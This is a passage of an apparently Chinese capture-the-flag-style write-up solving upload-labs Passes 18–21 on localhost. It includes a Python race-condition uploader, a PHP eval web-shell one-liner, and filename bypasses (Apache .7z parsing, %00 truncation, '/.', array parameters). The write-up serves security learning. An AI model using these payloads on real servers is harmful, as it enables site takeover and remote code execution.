class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们审计代码，发现首先上传文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(move_uploaded_file($temp_file, $upload_file))&#123;</span><br></pre></td></tr></table></figure>
+
+<p>然后检查后缀，如果上传成功则重命名。</p>
+<p>如果上传失败，则删除文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unlink($upload_file);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这里我们可以利用条件竞争写python脚本。</p>
+<p>我们要上传一个info.php文件，里面的内容是像文件夹写入一个一句话木马脚本，可是它的后缀是php会被删除，那么我们就只能利用条件竞争，使info.php在被unlink之前就访问到它，使其中的写入代码执行。</p>
+<p>具体脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CompeteUpload</span><span class="params">(list)</span>:</span></span><br><span class="line">    url=<span class="string">"http://localhost/uplab/Pass-18/index.php"</span></span><br><span class="line">    geturl=<span class="string">"http://localhost/uplab/upload/info.php"</span></span><br><span class="line">    upfile=&#123;<span class="string">'upload_file'</span>:(<span class="string">'info.php'</span>,open(<span class="string">"write.php"</span>,<span class="string">'rb'</span>),<span class="string">'image/jpeg'</span>)&#125;</span><br><span class="line">    data=&#123;<span class="string">'submit'</span>:<span class="string">'上传'</span>&#125;</span><br><span class="line">    r=requests.post(url=url,data=data,files=upfile)</span><br><span class="line">    print(<span class="string">"test upload...."</span>)</span><br><span class="line">    r1=requests.get(url=geturl)</span><br><span class="line">    <span class="keyword">if</span> r1.status_code==<span class="number">200</span>:</span><br><span class="line">        print(<span class="string">"upload success!"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    pool = Pool(<span class="number">10</span>)		 <span class="comment">#创建拥有10个进程数量的进程池</span></span><br><span class="line">    pool.map(CompeteUpload, range(<span class="number">1000</span>))    <span class="comment">#执行函数1000次</span></span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br></pre></td></tr></table></figure>
+
+<p>其中write.php内容如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">fputs(fopen(<span class="string">'shell.php'</span>,<span class="string">'w'</span>),<span class="string">'&lt;?php @eval($_POST["a1batr0ss"]);?&gt;'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h1 id="Pass19【条件竞争-apache解析漏洞】"><a href="#Pass19【条件竞争-apache解析漏洞】" class="headerlink" title="Pass19【条件竞争+apache解析漏洞】"></a>Pass19【条件竞争+apache解析漏洞】</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">"./myupload.php"</span>);</span><br><span class="line">    $imgFileName =time();</span><br><span class="line">    $u = <span class="keyword">new</span> MyUpload($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>], $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $_FILES[<span class="string">'upload_file'</span>][<span class="string">'size'</span>],$imgFileName);</span><br><span class="line">    $status_code = $u-&gt;upload(UPLOAD_PATH);</span><br><span class="line">    <span class="keyword">switch</span> ($status_code) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            $msg = <span class="string">'文件已经被上传，但没有重命名。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-1</span>:</span><br><span class="line">            $msg = <span class="string">'这个文件不能上传到服务器的临时文件存储目录。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-2</span>:</span><br><span class="line">            $msg = <span class="string">'上传失败，上传目录不可写。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-3</span>:</span><br><span class="line">            $msg = <span class="string">'上传失败，无法上传该类型文件。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-4</span>:</span><br><span class="line">            $msg = <span class="string">'上传失败，上传的文件过大。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-5</span>:</span><br><span class="line">            $msg = <span class="string">'上传失败，服务器已经存在相同名称文件。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-6</span>:</span><br><span class="line">            $msg = <span class="string">'文件无法上传，文件不能复制到目标目录。'</span>;</span><br><span class="line">            <span class="keyword">break</span>;      </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            $msg = <span class="string">'未知错误！'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//myupload.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyUpload</span></span>&#123;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">  <span class="keyword">var</span> $cls_arr_ext_accepted = <span class="keyword">array</span>(</span><br><span class="line">      <span class="string">".doc"</span>, <span class="string">".xls"</span>, <span class="string">".txt"</span>, <span class="string">".pdf"</span>, <span class="string">".gif"</span>, <span class="string">".jpg"</span>, <span class="string">".zip"</span>, <span class="string">".rar"</span>, <span class="string">".7z"</span>,<span class="string">".ppt"</span>,</span><br><span class="line">      <span class="string">".html"</span>, <span class="string">".xml"</span>, <span class="string">".tiff"</span>, <span class="string">".jpeg"</span>, <span class="string">".png"</span> );</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......  </span><br><span class="line">  <span class="comment">/** upload()</span></span><br><span class="line"><span class="comment">   **</span></span><br><span class="line"><span class="comment">   ** Method to upload the file.</span></span><br><span class="line"><span class="comment">   ** This is the only method to call outside the class.</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@para</span> String name of directory we upload to</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@returns</span> void</span></span><br><span class="line"><span class="comment">  **/</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">( $dir )</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;isUploadedFile();</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;setDir( $dir );</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;checkExtension();</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;checkSize();</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if flag to check if the file exists is set to 1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_file_exists == <span class="number">1</span> )&#123;</span><br><span class="line">      </span><br><span class="line">      $ret = <span class="keyword">$this</span>-&gt;checkFileExists();</span><br><span class="line">      <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we are here, we are ready to move the file to destination</span></span><br><span class="line"></span><br><span class="line">    $ret = <span class="keyword">$this</span>-&gt;move();</span><br><span class="line">    <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check if we need to rename the file</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_rename_file == <span class="number">1</span> )&#123;</span><br><span class="line">      $ret = <span class="keyword">$this</span>-&gt;renameFile();</span><br><span class="line">      <span class="keyword">if</span>( $ret != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( $ret );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if we are here, everything worked as planned :)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="string">"SUCCESS"</span> );</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+
+
+<blockquote>
+<h2 id="代码审计过程"><a href="#代码审计过程" class="headerlink" title="代码审计过程"></a>代码审计过程</h2><p>一些参数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$cls_upload_dir &#x3D; &quot;&quot;;         &#x2F;&#x2F; Directory to upload to.</span><br><span class="line">var $cls_max_filesize &#x3D; 33554432; &#x2F;&#x2F; Max file size.</span><br><span class="line">var $cls_arr_ext_accepted &#x3D; array(</span><br><span class="line">      &quot;.doc&quot;, &quot;.xls&quot;, &quot;.txt&quot;, &quot;.pdf&quot;, &quot;.gif&quot;, &quot;.jpg&quot;, &quot;.zip&quot;, &quot;.rar&quot;, &quot;.7z&quot;,&quot;.ppt&quot;,</span><br><span class="line">      &quot;.html&quot;, &quot;.xml&quot;, &quot;.tiff&quot;, &quot;.jpeg&quot;, &quot;.png&quot; );</span><br><span class="line">var $cls_file_exists &#x3D; 0;         &#x2F;&#x2F; Set to 1 to check if file exist before upload.</span><br><span class="line">var $cls_rename_file &#x3D; 1;         &#x2F;&#x2F; Set to 1 to rename file after upload.</span><br><span class="line">var $cls_verbal &#x3D; 0;              &#x2F;&#x2F; Set to 1 to return an a string instead of an error code.</span><br></pre></td></tr></table></figure>
+
+<p>创建对象：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cls_filename &#x3D; $file_name;   &#x2F;&#x2F; Name of the upload file.</span><br><span class="line">cls_tmp_filename &#x3D; $tmp_file_name;   &#x2F;&#x2F; TMP file Name (tmp name by php).</span><br><span class="line">cls_filesize &#x3D; $file_size;</span><br><span class="line">cls_file_rename_to &#x3D; $file_rename_to;   &#x2F;&#x2F;time()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="upload"><a href="#upload" class="headerlink" title="upload:"></a>upload:</h3><h4 id="isUploadedFIle"><a href="#isUploadedFIle" class="headerlink" title="isUploadedFIle()"></a>isUploadedFIle()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">is_uploaded_file( $this-&gt;cls_tmp_filename )</span><br></pre></td></tr></table></figure>
+
+<p>is_uploaded_file() 函数判断指定的文件是否是通过 HTTP POST 上传的。</p>
+<h4 id="setDir-UPLOAD-PATH"><a href="#setDir-UPLOAD-PATH" class="headerlink" title="setDir( UPLOAD_PATH )"></a>setDir( UPLOAD_PATH )</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">is_writable( UPLOAD_PATH )</span><br></pre></td></tr></table></figure>
+
+<p>is_writable() 函数判断指定的文件是否可写。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;cls_upload_dir &#x3D; UPLOAD_PATH;	&#x2F;&#x2F;给dir赋值</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="checkExtension"><a href="#checkExtension" class="headerlink" title="checkExtension()"></a>checkExtension()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">in_array( strtolower( strrchr( $this-&gt;cls_filename, &quot;.&quot; )), $this-&gt;cls_arr_ext_accepted )</span><br></pre></td></tr></table></figure>
+
+<p>检查上传文件时初始的文件名后缀是否符合白名单</p>
+<h4 id="checkSize"><a href="#checkSize" class="headerlink" title="checkSize()"></a>checkSize()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;cls_filesize &lt; $this-&gt;cls_max_filesize</span><br></pre></td></tr></table></figure>
+
+<p>即上传文件的大小要小于32MB</p>
+<h4 id="checkFileExists"><a href="#checkFileExists" class="headerlink" title="checkFileExists()"></a>checkFileExists()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_exists( $this-&gt;cls_upload_dir . $this-&gt;cls_filename )</span><br></pre></td></tr></table></figure>
+
+<p>判断文件是否原来就存在</p>
+<h4 id="move"><a href="#move" class="headerlink" title="move()"></a>move()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">move_uploaded_file( $this-&gt;cls_tmp_filename, $this-&gt;cls_upload_dir . $this-&gt;cls_filename ) &#x3D;&#x3D; true</span><br></pre></td></tr></table></figure>
+
+<p>判断文件是否成功上传，文件名为初始文件名</p>
+<p><strong>通过这个函数后，文件就已经被上传到服务器了</strong></p>
+<h4 id="renameFile"><a href="#renameFile" class="headerlink" title="renameFile()"></a>renameFile()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rename( $this-&gt;cls_upload_dir . $this-&gt;cls_filename, $this-&gt;cls_upload_dir . $this-&gt;cls_file_rename_to )</span><br></pre></td></tr></table></figure>
+
+<p>判断重命名是否成功【不改变后缀】</p>
+<p>如果全部通过这些函数，那么文件上传成功</p>
+</blockquote>
+<p>简单的说，就是利用文件上传至服务器到文件重命名中间这一段空隙，来执行已经上传的文件，生成一句话木马，而因为白名单的限制，我们可以利用apache解析漏洞，即白名单有.7z而apache不能解析.7z来上传base.php.7z绕过白名单，到服务器时变成base.php。</p>
+<h2 id="小发现4"><a href="#小发现4" class="headerlink" title="小发现4"></a>小发现4</h2><p>复现并理解apache解析漏洞。</p>
+<h1 id="Pass20【“-”结尾法-和-POST方法-00截断2】"><a href="#Pass20【“-”结尾法-和-POST方法-00截断2】" class="headerlink" title="Pass20【“/.”结尾法 和 POST方法%00截断2】"></a>Pass20【“/.”结尾法 和 POST方法%00截断2】</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"pht"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = $_POST[<span class="string">'save_name'</span>];</span><br><span class="line">        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext,$deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">'/'</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123; </span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">'禁止保存为该类型文件！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>先测试了下<code>pathinfo($file_name,PATHINFO_EXTENSION)</code>函数</p>
+<p><img src="/2021/01/29/upload-labs/20-1.png" alt="20-1"></p>
+<p><img src="/2021/01/29/upload-labs/20-2.png" alt="20-2"></p>
+<p>就想到可以利用%00截断：</p>
+<p><img src="/2021/01/29/upload-labs/20-3.png" alt="20-3"></p>
+<p>找到上传名称里故意留的空格20，改成00</p>
+<p><img src="/2021/01/29/upload-labs/20-4.png" alt="20-4"></p>
+<p><img src="/2021/01/29/upload-labs/20-5.png" alt="20-5"></p>
+<p>即可上传成功，到服务器时，%00后的内容自动被截断剩下base.php</p>
+<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>还遇到一种网上另一种方法：</p>
+<blockquote>
+<p>文件名改为base.php/.<code>，move_uploaded_file函数结尾遇到</code>/.`的时候会删除它。</p>
+</blockquote>
+<h1 id="Pass21【数组绕过-“-”绕过】"><a href="#Pass21【数组绕过-“-”绕过】" class="headerlink" title="Pass21【数组绕过+“/.”绕过】"></a>Pass21【数组绕过+“/.”绕过】</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">'upload_file'</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    $allow_type = <span class="keyword">array</span>(<span class="string">'image/jpeg'</span>,<span class="string">'image/png'</span>,<span class="string">'image/gif'</span>);</span><br><span class="line">    <span class="keyword">if</span>(!in_array($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>],$allow_type))&#123;</span><br><span class="line">        $msg = <span class="string">"禁止上传该类型文件!"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名</span></span><br><span class="line">        $file = <span class="keyword">empty</span>($_POST[<span class="string">'save_name'</span>]) ? $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>] : $_POST[<span class="string">'save_name'</span>];</span><br><span class="line">        <span class="keyword">if</span> (!is_array($file)) &#123;</span><br><span class="line">            $file = explode(<span class="string">'.'</span>, strtolower($file));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $ext = end($file);</span><br><span class="line">        $allow_suffix = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">        <span class="keyword">if</span> (!in_array($ext, $allow_suffix)) &#123;</span><br><span class="line">            $msg = <span class="string">"禁止上传该后缀文件!"</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $file_name = reset($file) . <span class="string">'.'</span> . $file[count($file) - <span class="number">1</span>];</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">'/'</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $msg = <span class="string">"文件上传成功！"</span>;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">"文件上传失败！"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $msg = <span class="string">"请选择要上传的文件！"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果按正常思维，这里是没有漏洞的，但是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (!is_array($file)) &#123;</span><br><span class="line">           $file &#x3D; explode(&#39;.&#39;, strtolower($file));</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>
+
+<p>让我们想到如果上传一个数组。</p>
+<blockquote>
+<h2 id="数组的长度之谜"><a href="#数组的长度之谜" class="headerlink" title="数组的长度之谜"></a>数组的长度之谜</h2><p>当我们上传一个数组，只上传array[0]和array[2]时，此时array[1]值为空，且数组count为2.</p>
+<p>此时 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file[count($file) - 1] !&#x3D; end($file)</span><br></pre></td></tr></table></figure>
+
+<p>具体测试如下：</p>
+<p><img src="/2021/01/29/upload-labs/21-2.png" alt="21-2"></p>
+<p><img src="/2021/01/29/upload-labs/21-3.png" alt="21-3"></p>
+</blockquote>
+<p>如下图，我们的<code>$file[count($file) - 1]</code>就为空，<code>$file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1];</code>的值就是base.php.    ，其中结尾的.会被windows自动忽略。</p>
+<p>当然我们也可以利用Pass19学习的/.绕过，使save_name[0]=base.php/，拼接完成后base.php/.最后的/.会被move_uploaded_file过滤</p>
+<p><img src="/2021/01/29/upload-labs/21-1.png" alt="21-1"></p>
+<blockquote>
+<p>注意：bp里————9921那一行和后面Content-Disposition那一行中间不能有空行，否则bp会不识别空行之后的内容！</p>
+</blockquote>
+<p><a href="https://blog.csdn.net/u014029795/article/details/102917199" target="_blank" rel="noopener">参考这一篇</a></p>
